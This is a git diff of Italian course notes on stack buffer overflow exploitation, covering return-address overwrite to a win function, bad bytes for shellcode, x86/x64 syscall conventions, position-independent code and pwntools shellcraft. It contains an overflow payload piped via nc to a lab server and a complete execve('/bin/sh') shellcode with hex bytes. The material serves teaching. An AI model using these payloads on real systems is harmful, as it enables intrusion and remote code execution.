@@ -72,6 +72,7 @@ La tecnica funziona nella maggior parte dei casi, ma non sempre: se il crash è 
 ## bof-demo/exploit6.py
 
 Con questo programma sappiamo che 88 è il numero di byte necessari per raggiungere il saved return address. E sappiamo che all’interno del programma esiste una funzione win. E quella funzione win si trova a 0x0401166 
+NOTA: il programma non è PI e la funzioen win si trova sempre a quell’indirizzo ed è stato trovate con objdump o ghidra.
 
 Quindi possiamo far sì che il programma esegua quella funzione raggiungendo il saved return address e sostituendo il valore originale con l’indirizzo della funzione che vogliamo venga chiamata. Il codice è già lì.
 
@@ -119,11 +120,14 @@ Allora, come possiamo generare una shell? In C potete usare chiamate di libreria
 
 Ora, qual è il problema nell’usare una chiamata di libreria? Prima di tutto, non sapete se la libreria si trovi in memoria, perché state semplicemente iniettando del codice in un processo e non avete idea del layout di quel processo. Finora, nei miei esempi, ho usato processi in esecuzione sulla mia macchina, quindi potevo controllarne lo spazio degli indirizzi. Ma se pensate a un servizio che gira su una macchina remota, non avete alcuna idea dello spazio degli indirizzi della macchina remota. Quindi non potete sapere se e dove sia caricata la libc. Dunque dovreste invocare le system call, perché potete sempre invocare direttamente una system call, senza passare dal wrapper di libreria, naturalmente. E poi, come ho detto, dovreste scrivere codice position‑independent, perché, di nuovo, non controllate dove si trovi il buffer. Ogni volta che il programma gira, il buffer potrebbe trovarsi a un indirizzo diverso. Quindi, per far sì che lo shellcode funzioni in molti ambienti diversi, dovreste scrivere codice position‑independent e dovreste evitare alcuni valori particolari.
 
+- Se il programma ha il buffer overflow a causa di una `strcpy` (o `strstpr`), allora il byte `0x00` è proibito.
+- Se il buffer overflow è dovuto a `gets`, allora il byte `0x00` è ammesso, ma il newline (`0x0A`) non è consentito.
+- Se il buffer overflow è causato da una system call `read`, tutti i byte sono ammessi, ma il payload è limitato alla quantità di byte letti (ad esempio, se legge solo 100 byte, il payload massimo è di 100 byte).
+- Con `gets` puoi inviare una quantità arbitraria di dati, purché non contenga il byte `0x0A`.
+- Con `scanf`, i caratteri proibiti possono includere spazi bianchi o altri caratteri specifici in base al formato utilizzato.
 
-- Il terminatore di stringa (gets() si ferma al primo terminatore di stringa).
-- il newline 
-- a volte avete solo un overflow di un byte o di due byte, e dovete arrangiarvi con quello che avete.
-- possono esserci vincoli imposti da un particolare programma: per esempio, se il programma chiede il vostro nome e poi lo trasforma in maiuscolo, trasformerà la sequenza di byte che inviate al programma in un certo modo. Quindi magari potete prevedere che i vostri byte saranno trasformati in quel modo e inviare dei byte tali che, una volta trasformati.
+Inoltre, i byte che inviamo possono essere trasformati prima di essere eseguiti.
+Esempio: se il programma legge il tuo nome e lo converte in uppercase prima del buffer overflow, allora i tuoi byte verranno trasformati nella versione maiuscola, e devi tenerne conto per generare la shellcode.
 
 
 una volta che la shell viene creata.
@@ -145,8 +149,9 @@ La shell capisce di essere stata eseguita con privilegi temporaneamente elevati 
 
 Quindi, quando volete aprire un file, chiamate una funzione che si chiama open, che ha lo stesso nome della system call. L’implementazione di quel wrapper invocherà la system call con dell’assembly ad hoc.
 
-Per Linux dobbiamo mettere il numero della system call in EAX e gli argomenti, in quest’ordine, in 
-EBX, ECX, EDX, SI, EDI e EBP.
+Per Linux dobbiamo mettere il numero della system call in `EAX`
+e gli argomenti, in quest’ordine, in 
+`EBX`, `ECX`, `EDX`, `ESI`, `EDI` e `EBP`.
 
  Poi eseguire l’istruzione int 0x80, che è un software interrupt: una trap per il kernel che invocherà la system call. Al ritorno, EAX conterrà il valore di ritorno e tutti gli altri registri saranno preservati.
 
@@ -160,6 +165,8 @@ Compilare con
 nasm -f elf32 -o hello32-prog.o hello32.asm #assembled
 ld -m elf_i386 -o hello32-prog hello32-prog.o #linked
 ```
+
+NOTA: he INT 0x80 instruction has the binary opcode 11001101 10000000, which in hexadecimal becomes CD 80.
 
 However
 
@@ -184,9 +191,11 @@ mov ecx, msg    ; use string "Hello World"
 ```
 
 Ci sono però due cose che sono position‑independent: 
+
 - i salti (jump) e le chiamate (call). 
 
 Anche se la sintassi suggerisce il contrario — potete vedere “jump 100” e pensare “ok, 100 è un valore assoluto”: in realtà il processore codifica questa istruzione come distanza, negativa o positiva, dall’attuale instruction pointer all’indirizzo a cui vogliamo saltare o che vogliamo chiamare. Quindi le istruzioni jmp e call sono position‑independent. Inoltre, per definizione, ogni accesso allo stack dipende dal registro ESP, ma è normale non conoscere la posizione di ESP, quindi ogni volta usate semplicemente ESP più o meno un offset. Di conseguenza, anche quello è position‑independent.
+
 
 
 ### sc-run/hello32-call.asm
@@ -196,9 +205,9 @@ Ecco quindi un modo per rendere questo position‑independent; usiamo un trucco 
 
 This assembly code can be:
 
-- Assembled: `nasm -f elf32 -o hello32-call.o hello32-call.asm`
+- Assembled: `nasm hello32-call.asm`
 - Injected: `./sc-run32 < hello32-call-sc`
-- Debugged: `gdb sc-run32`, then: `run < hello32-call-sc`
+- Debugged: `gdb sc-run32`, then: `run int3 < hello32-call-sc`
 
 Alternatively, you can create an ELF program:
 
@@ -221,8 +230,88 @@ Similarly, we can get a PIC shellcode by leveraging the stack:
 - Injected: `./sc-run32 < hello32-stack`
 
 
-## in 664 bit
+## in 64 bit
 
-Non molto diverso. Il numero della system call va RDI, RSI, RDX, R10, R8, R9. Notate che i numeri delle system call sono diversi. Quindi, se volessi eseguire, per esempio, write in Linux a 64 bit, devo usare un numero diverso. Se ricordate, write a 32 bit era 4, mentre in Linux a 64 bit è 1, per esempio. 
+Non molto diverso. Il numero della system call va `RAX`, e gli argomenti vanno in
+`RDI`, `RSI`, `RDX`, `R10`, `R8`, `R9`. Notate che i numeri delle system call sono diversi. Quindi, se volessi eseguire, per esempio, write in Linux a 64 bit, devo usare un numero diverso. Se ricordate, write a 32 bit era 4, mentre in Linux a 64 bit è 1, per esempio. 
 
 L’ho già detto: non ho idea del perché abbiano cambiato i numeri, le system call sono le stesse. Quindi controllate il numero, impostate i parametri, e questa volta usate l’istruzione sys call invece di sollevare un software interrupt. Per il resto è lo stesso.  RCX e R11 sono preservati: non possono essere preservati perché l’istruzione di system call li usa per salvare l’IP e i flags. E questo è anche un trucco, talvolta, per ottenere l’instruction pointer.
+
+This assembly code can be:
+
+- assembled `nasm -f elf64 hello64.asm`
+- Linked: `ld -m elf_x86_64 -o hello64 hello64.o`
+
+
+- assembled `nasm hello64.asm -o hello64-pic`
+- Injected: `./sc-run64 < hello64-pic`
+
+
+## use REMOTE instead of LOCAL 
+
+Nota divernte del porg: 
+If you can escape that and run something in the real server, you can pass the exam with fine colors and unlock an achievement. But it's not so easy to. I mean, as far as I know, there is no way to do that. I used starting from Google to create a jail. But if you are up to a challenge, try to escape that challenge.
+
+```sh
+python3 -c 'import os; os.write(1, b"a"*64 + b"\xee\xff\xc0\x00" + b"\n")' | nc 192.168.20.1 5181
+python3 exploit7.py REMOTE
+```
+
+Cosa c'è dentro Shellcraft.sh? Vediamo. Quindi da pound, importiamo star. Ok, ix context.binary è. Ora posso assegnare un file elf o semplicemente definire il nome del file elf aperto in modo da poterli assegnare. Questo è importante perché in questo modo, pound tools capisce che sto lavorando con un eseguibile x86 e così via. Quindi, quando richiedo del codice shell, mi fornirà un codice shell per x86 su una macchina a 64 bit. Lasciate che vi mostri questo. Se scrivo print shellcraft.sh, ottengo questo codice shell. Ma se non ho impostato il contesto, almeno importiamo gli strumenti pound, dovreste vedere che è simile, ma diverso. Quindi, ad esempio, qui imposta il registro RAX, che è disponibile solo in modalità a 64 bit, mentre in questo imposta EBX e così via. Quindi impostare il contesto è piuttosto importante.
+
+
+
+```sh
+python3
+
+>>> from pwn import *
+>>> context.binary='./bof-demo'
+>>> print(shellcraft.sh())
+
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push b'/bin///sh\x00' */
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array ['sh\x00'] */
+    /* push b'sh\x00' */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+    add rsi, rsp
+    push rsi /* 'sh\x00' */
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+    syscall
+```
+
+NOtare che se guarda l hex dell shellcode, non ci sono 00 and 0a bytes per evtare probemi noti di terminazione stringa e newline.
+
+```sh
+>>> enhex(asm(shellcraft.sh()))
+6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05
+```
+
+Salviamo lo shellcode per analizzarlo 
+
+```sh
+>>> shellcode=asm(shellcraft.sh())
+>>> with open('spawn_sh', 'wb') as f:
+>>> f.write(shellcode)
+>>> f.close()
+```
+
+Debugghiamo 
+
+```sh
+ndisasm -b 64 spawn_sh
+gdb ./sc-run64
+run int3 < spawn_sh
+```
